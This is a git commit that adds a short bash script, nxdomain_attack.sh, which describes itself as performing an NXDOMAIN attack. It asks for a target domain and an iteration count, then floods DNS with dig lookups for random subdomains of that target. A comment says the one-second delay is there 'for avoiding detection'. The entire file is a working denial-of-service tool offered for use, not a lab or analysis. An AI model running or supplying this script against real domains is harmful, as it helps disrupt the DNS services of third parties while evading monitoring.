9d7ca9b864adf3c98a6f2ae685bc71749be5ec02
nick22d <ndoropoulos@yahoo.com>
2021-08-07 15:04:23 +0100

    Create nxdomain_attack.sh

---
+++ nxdomain_attack.sh
@@ -0,0 +1,30 @@
+#!/bin/bash
+# Description: The purpose of this script is to perform an NXDOMAIN attack against the target
+
+###################
+# VARIABLES SECTION
+###################
+
+i=0
+
+############
+# MAIN BODY
+############
+
+# Prompting the user for the target domain (i.e. example.com).
+echo "Please type the apex domain of your target: "
+read TARGET
+
+# Prompting the user for the desired number of lookup requests against the target.
+echo "Please type the number of iterations: "
+read ITERATIONS
+
+# Carrying out the attack against the supplied target for the specified number of iterations.
+while [ $i -lt $ITERATIONS ]
+do
+        dig `cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1`.$TARGET # Creating a random subdomain which is prepended to the target before performing the query.
+        sleep 1 # Adding a delay between lookup requests for avoiding detection. Feel free to increment this value as per your use case.
+        let "i++"
+done
+
+exit 0
